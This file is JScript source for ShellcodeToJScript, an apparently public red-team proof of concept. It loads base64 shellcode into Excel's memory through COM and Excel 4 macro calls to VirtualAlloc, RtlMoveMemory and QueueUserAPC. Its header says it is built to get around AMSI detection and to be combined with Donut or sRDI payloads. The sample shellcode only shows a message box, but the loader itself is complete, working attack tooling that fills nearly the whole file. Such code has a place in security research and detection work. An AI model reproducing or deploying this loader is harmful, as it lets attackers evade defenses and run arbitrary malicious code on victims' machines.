// ShellcodeToJScript
//
// Proof of Concept code for shellcode loading in JScript by abusing Excel 4 macros via COM.
// This serves as an alternative to James Forshaw's DotNetToJScript, which does no longer work
// on newer versions of Windows or gets flagged by AMSI.
//
// Combine this script with shellcode generated by Donut (https://github.com/TheWover/donut)
// in case you want to load .NET assemblies. Or sRDI (https://github.com/monoxgas/sRDI) for 
// reflectively loading DLLs.
//
// Author: Stan Hegt (@StanHacked) / Outflank
//
// In order to understand the techniques used in this PoC, read the following blog posts:
// https://outflank.nl/blog/2018/10/06/old-school-evil-excel-4-0-macros-xlm/
// https://www.cybereason.com/blog/excel4.0-macros-now-with-twice-the-bits (by @PhilipTsukerman)

function setVersion() {
	new ActiveXObject('WScript.Shell').Environment('Process')('COMPLUS_Version') = 'v4.0.30319';
}

function base64ToStream(b) {
	var enc = new ActiveXObject("System.Text.ASCIIEncoding");
	var length = enc.GetByteCount_2(b);
	var ba = enc.GetBytes_4(b);
	var transform = new ActiveXObject("System.Security.Cryptography.FromBase64Transform");
	ba = transform.TransformFinalBlock(ba, 0, length);
	
	var ms = new ActiveXObject("System.IO.MemoryStream");
	ms.Write(ba, 0, Math.floor((length / 4) * 3 / 4) * 4);
	ms.Position = 0;
	return ms;
}

// prevent .NET framework 3.5 installation popups on newer Windows versions
setVersion();

// base64 encoded position independent shellcode payload for 32 bit systems
// This example is a x86 MessageBox shellcode inspired by https://blog.didierstevens.com/programs/shellcode/
var encodedPayload32 = "6AAAAABbjbMTAQAAVo2zDwEAAFZqAWiIjwMA6BMAAABqAI2DFwEAAFBQagD/kxMBAADDVYnlUVZXi00Mi3UQi30U/zb/dQjoEwAAAIkHg8cEg8YE4uxfXlmJ7F3CEABVieVTVldRZP81MAAAAFiLQAyLSAyLEYtBMGoCi30IV1DoWwAAAIXAdASJ0evni0EYUItYPAHYi1h4WFABw4tLHItTIItbJAHBAcIBw4syWFABxmoB/3UMVugjAAAAhcB0CIPCBIPDAuvjWDHSZosTweICAdEDAVlfXluJ7F3CCABVieVRU1IxyTHbMdKLRQiKEIDKYAHT0eMDRRCKCITJ4O4xwItNDDnLdAFAWltZiexdwgwAGrgGAAAAAABIZWxsbyBmcm9tIGluamVjdGVkIHNoZWxsY29kZSEgIAA=";

// base64 encoded position independent shellcode payload for 64 bit systems
// This example is a x64 MessageBox shellcode inspired by https://blog.didierstevens.com/programs/shellcode/
var encodedPayload64 =  "SIPsSEiD5PBMjUQkKEiNFdoBAABIjQ3GAQAA6GQAAABMi0wkKEyNRCQwSI0VygEAAEiNDakBAADoRwAAAEiNDcMBAAD/VCQoTItMJChMjUQkOEiNFbkBAABIjQ2nAQAA6B8AAABNMclMjQXLAQAASI0VqAEAAEgxyf9UJDhIMcn/VCQwSIHsaAEAAEiJXCQoSIlsJDBIiXwkOEiJdCRATIlkJEhMiWwkUEyJdCRYTIl8JGBlTIscJWAAAABNi1sYTY1bEE2J302LG/xJi3tgSInOrITAdCaKJ4D8YXwDgOwgOMR1CEj/x0j/x+vlTYsbTTn7ddZIMcDpsQAAAEmLWzBEi2M8SQHcSYHEiAAAAEWLLCRNhe11CEgxwOmOAAAATo0cK0WLdCQETQHuQYtLGEWLUyBJAdr/yU2NJIpBizwkSAHfSInWpnUIigaEwHQJ6/Xi5UgxwOtVRYtjJEkB3GZBiwxMRYtjHEkB3EGLBIxMOeh8Nkw58HMxSI00GEiNfCRopIA+LnX6pMcHRExMAE2JxkiNTCRoQf/RTYnwSI1MJGhIifLpCP///0gB2EmJAEiLXCQoSItsJDBIi3wkOEiLdCRATItkJEhMi2wkUEyLdCRYTIt8JGBIgcRoAQAAw0tFUk5FTDMyLkRMTABMb2FkTGlicmFyeUEARXhpdFByb2Nlc3MAVVNFUjMyLkRMTABNZXNzYWdlQm94QQBIaSBmcm9tIGluamVjdGVkIHNoZWxsY29kZSEAU2hlbGxjb2RlVG9KU2NyaXB0IFBvQyAA";

// Instantiate Excel COM object for automation
var objExcel = new ActiveXObject("Excel.Application");

// Determine whether Excel is 32 bits or 64 bits via the COM object's OperatingSystem property
var excelOS = objExcel.OperatingSystem;
if (excelOS.indexOf("32-bit") >= 0) {
	var is32Bits = true;
	var streamPayload = base64ToStream(encodedPayload32);
	var bruteforceAddress = 0;
} else {
	var is32Bits = false;
	var streamPayload = base64ToStream(encodedPayload64);
	var bruteforceAddress = 0x50000000;
}

// Allocate memory buffer for payload in Excel.exe (RWX because PoC YOLO)
var memAddress = 0;
if (!is32Bits) {
	// 64 bit system, brute force a memory address that fits in 32 bit int
	while ((memAddress == 0) && (bruteforceAddress  < 0xFFFFFFFF)) {
		memAddress = objExcel.ExecuteExcel4Macro("CALL(\"Kernel32\",\"VirtualAlloc\",\"JJJJJ\"," + bruteforceAddress.toString() + "," + streamPayload.length + ",12288,64)");
		bruteforceAddress += 0x10000;
	}	
} else {
	// 32 bit system, have the system allocate a random block of memory
	memAddress = objExcel.ExecuteExcel4Macro("CALL(\"Kernel32\",\"VirtualAlloc\",\"JJJJJ\"," + bruteforceAddress.toString() + "," + streamPayload.length + ",12288,64)");
}

if (memAddress == 0) {
	WScript.Echo("Error allocating memory");
	WScript.Quit(1);
}

// Loop for copying payload to allocated buffer
var currentAddress = memAddress; // cursor for memory
var charString; // Excel-escaped byte string to be written in buffer
var currentLength = 0; // length of current byte string under construction
var currentByte = 0; // buffer for reading shellcode byte per byte
while (currentByte >= 0) {
	currentByte = streamPayload.ReadByte();
	
	if (currentByte == 0) {
		// Excel fails on CHAR(0), so we skip it since VirtualAlloc initializes with zeroes anyways
		if (currentLength > 0) {
			objExcel.ExecuteExcel4Macro("CALL(\"Kernel32\",\"RtlMoveMemory\",\"JJCJ\"," + currentAddress.toString() + "," + charString + "," + currentLength.toString() + ")");
		}
				
		currentAddress += currentLength + 1;
		currentLength = 0;
		charString = "";
		continue;
	} else if (currentByte > 0) {
		// Process byte
		if (currentLength == 0) {
			// Start new string
			charString = "CHAR(" + currentByte.toString() + ")";
		} else {
			// Append to string
			charString += "&CHAR(" + currentByte.toString() + ")";
		}
		currentLength++;		
	} else {
		// Write final bytes
		objExcel.ExecuteExcel4Macro("CALL(\"Kernel32\",\"RtlMoveMemory\",\"JJCJ\"," + currentAddress.toString() + "," + charString + "," + currentLength.toString() + ")");
		continue;
	}
	
	// Write bytes and reset counter to avoid long strings, on which Excel4 fails
	if (currentLength == 10) {
		objExcel.ExecuteExcel4Macro("CALL(\"Kernel32\",\"RtlMoveMemory\",\"JJCJ\"," + currentAddress.toString() + "," + charString + "," + currentLength.toString() + ")");
				
		currentAddress += currentLength;
		currentLength = 0;
		charString = "";
	}	
}

// Kick off payload thread via QueueUserAPC
objExcel.ExecuteExcel4Macro("CALL(\"Kernel32\",\"QueueUserAPC\",\"JJJJ\"," + memAddress + ", -2, 0)");